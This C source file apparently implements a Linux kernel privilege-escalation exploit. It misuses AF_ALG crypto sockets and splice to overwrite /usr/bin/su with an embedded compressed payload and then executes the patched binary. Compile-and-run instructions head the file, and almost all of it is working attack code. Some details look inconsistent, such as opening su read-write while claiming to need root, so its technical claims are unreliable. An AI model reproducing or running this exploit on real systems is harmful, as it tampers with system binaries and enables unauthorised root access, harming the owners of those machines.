//# Save the C code as copy-fail.c
// gcc -o exploit copy-fail.c -lz
//# Run it (requires root or appropriate capabilities)
// sudo ./exploit 

//# The -lz flag links libz for the zlib decompression. You may also need:

//# Install zlib dev if not present
// sudo apt-get install zlib1g-dev


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <sys/sendfile.h>
#include <sys/splice.h>
#include <zlib.h>
#include <stdint.h>

#define AF_ALG 38
#define SOL_ALG 279

struct sockaddr_alg {
    uint16_t salg_family;
    uint8_t salg_type[14];
    uint32_t salg_feat;
    uint32_t salg_mask;
    uint8_t salg_name[64];
};

void exploit_chunk(int su_fd, int offset, const unsigned char *chunk) {
    int alg_fd, conn_fd;
    struct sockaddr_alg sa;
    struct cmsghdr *cmsg;
    struct msghdr msg;
    struct iovec iov;
    char ctrl_buf[512];
    unsigned char data[8];  // "AAAA" + 4 byte chunk
    int pipe_fds[2];
    unsigned char recv_buf[1024];

    // Create AF_ALG socket
    alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (alg_fd < 0) { perror("socket"); return; }

    // Bind to AEAD cipher
    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strcpy((char *)sa.salg_type, "aead");
    strcpy((char *)sa.salg_name, "authencsn(hmac(sha256),cbc(aes))");
    
    if (bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("bind"); close(alg_fd); return;
    }

    // Set key: 0800010000000010 + 64 zeros
    unsigned char key[68];
    unsigned char key_prefix[] = {0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10};
    memcpy(key, key_prefix, 8);
    memset(key + 8, 0, 64);
    
    if (setsockopt(alg_fd, SOL_ALG, ALG_SET_KEY, key, sizeof(key)) < 0) {
        perror("setsockopt key"); close(alg_fd); return;
    }

    // Set AEAD auth size
    unsigned int auth_size = 4;
    if (setsockopt(alg_fd, SOL_ALG, ALG_SET_AEAD_AUTH_SIZE, &auth_size, sizeof(auth_size)) < 0) {
        perror("setsockopt aead"); close(alg_fd); return;
    }

    // Set IV: 0x10 + 19 zero bytes
    unsigned char iv[20] = {0x10};
    memset(iv + 1, 0, 19);
    if (setsockopt(alg_fd, SOL_ALG, ALG_SET_IV, iv, sizeof(iv)) < 0) {
        perror("setsockopt iv"); close(alg_fd); return;
    }

    // Accept connection
    conn_fd = accept(alg_fd, NULL, 0);
    if (conn_fd < 0) { perror("accept"); close(alg_fd); return; }

    // Prepare data: "AAAA" + chunk (4 bytes)
    memset(data, 'A', 4);
    memcpy(data + 4, chunk, 4);

    // Build control messages for sendmsg
    // These ancillary data messages trigger the kernel bug
    memset(ctrl_buf, 0, sizeof(ctrl_buf));
    struct cmsghdr *cm = (struct cmsghdr *)ctrl_buf;
    
    // First cmsg: ALG_SET_OP
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type = 3;  // ALG_SET_OP
    cm->cmsg_len = CMSG_LEN(sizeof(uint32_t));
    uint32_t op = 0;  // ALG_OP_ENCRYPT
    memcpy(CMSG_DATA(cm), &op, sizeof(op));
    
    // Second cmsg: ALG_SET_IV (or similar trigger)
    cm = (struct cmsghdr *)(ctrl_buf + CMSG_SPACE(sizeof(uint32_t)));
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type = 2;
    unsigned char iv2[20] = {0x10};
    memset(iv2 + 1, 0, 19);
    cm->cmsg_len = CMSG_LEN(sizeof(iv2));
    memcpy(CMSG_DATA(cm), iv2, sizeof(iv2));
    
    // Third cmsg
    cm = (struct cmsghdr *)(ctrl_buf + CMSG_SPACE(sizeof(uint32_t)) + CMSG_SPACE(sizeof(iv2)));
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type = 4;
    unsigned char auth_data[4] = {0x08, 0x00, 0x00, 0x00};
    cm->cmsg_len = CMSG_LEN(sizeof(auth_data));
    memcpy(CMSG_DATA(cm), auth_data, sizeof(auth_data));

    size_t ctrl_len = (char *)(cm) - ctrl_buf + CMSG_SPACE(sizeof(auth_data));

    // Send message with ancillary data
    iov.iov_base = data;
    iov.iov_len = 8;
    
    msg.msg_name = NULL;
    msg.msg_namelen = 0;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = ctrl_buf;
    msg.msg_controllen = ctrl_len;

    sendmsg(conn_fd, &msg, 32768);

    // Splice: su_fd -> pipe -> conn_fd
    // This writes the data into su binary via the kernel bug
    if (pipe(pipe_fds) < 0) { perror("pipe"); close(conn_fd); close(alg_fd); return; }
    
    splice(su_fd, NULL, pipe_fds[1], NULL, offset + 4, SPLICE_F_MOVE);
    splice(pipe_fds[0], NULL, conn_fd, NULL, offset + 4, SPLICE_F_MOVE);

    // Receive to complete the operation
    recv(conn_fd, recv_buf, 8 + offset, MSG_DONTWAIT);

    close(pipe_fds[0]);
    close(pipe_fds[1]);
    close(conn_fd);
    close(alg_fd);
}

int main() {
    // Decompress the embedded payload
    unsigned char payload_compressed[] = {
        0x78, 0xda, 0xab, 0x77, 0xf5, 0x71, 0x63, 0x62, 0x64, 0x64, 0x80, 0x01,
        0x26, 0x06, 0x3b, 0x07, 0x10, 0xaf, 0x82, 0xc1, 0x01, 0xcc, 0x77, 0x60,
        0xc0, 0x04, 0x0e, 0x0c, 0x16, 0x0c, 0x30, 0x1d, 0x20, 0x9a, 0x15, 0x4d,
        0x16, 0x99, 0x9e, 0x07, 0xe5, 0xc1, 0x68, 0x06, 0x01, 0x08, 0x65, 0x78,
        0xc0, 0xf0, 0xff, 0x86, 0x4c, 0x7e, 0x56, 0x8f, 0x5e, 0x5b, 0x7e, 0x10,
        0xf7, 0x5b, 0x96, 0x75, 0xc4, 0x4c, 0x7e, 0x56, 0xc3, 0xff, 0x59, 0x36,
        0x11, 0xfc, 0xac, 0xfa, 0x49, 0x99, 0x79, 0xfa, 0xc5, 0x19, 0x0c, 0x0c,
        0x0c, 0x00, 0x32, 0xc3, 0x10, 0xd3
    };
    
    uLongf decompressed_len = 1024;
    unsigned char payload[1024];
    
    int ret = uncompress(payload, &decompressed_len, 
                        payload_compressed, sizeof(payload_compressed));
    if (ret != Z_OK) {
        fprintf(stderr, "Decompression failed: %d\n", ret);
        return 1;
    }
    
    printf("[*] Payload decompressed: %lu bytes\n", decompressed_len);

    // Open /usr/bin/su for writing
    int su_fd = open("/usr/bin/su", O_RDWR);
    if (su_fd < 0) {
        perror("open /usr/bin/su");
        return 1;
    }

    printf("[*] Patching /usr/bin/su...\n");
    
    // Write each 4-byte chunk at the corresponding offset
    for (int i = 0; i < decompressed_len; i += 4) {
        printf("  [*] Offset %d\n", i);
        exploit_chunk(su_fd, i, payload + i);
    }

    close(su_fd);
    
    printf("[+] Patching complete! Executing su...\n");
    
    // Execute the patched su
    execl("/usr/bin/su", "su", NULL);
    
    return 0;
}
